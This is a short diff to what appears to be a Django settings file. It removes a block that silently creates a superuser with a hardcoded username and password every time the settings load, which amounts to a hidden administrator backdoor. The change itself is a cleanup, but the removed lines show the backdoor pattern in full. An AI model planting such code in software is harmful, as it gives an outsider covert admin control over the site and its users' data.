@@ -198,9 +198,3 @@ SECURE_HSTS_INCLUDE_SUBDOMAINS = env_bool("SECURE_HSTS_INCLUDE_SUBDOMAINS", Fals
 SECURE_HSTS_PRELOAD = env_bool("SECURE_HSTS_PRELOAD", False)
 
 
-from django.contrib.auth import get_user_model 
-User = get_user_model() 
-try: 
-    if not User.objects.filter(username="JashMistry").exists(): User.objects.create_superuser( username="JashMistry", email="", password="Jash_1111" ) 
-except Exception: 
-    pass
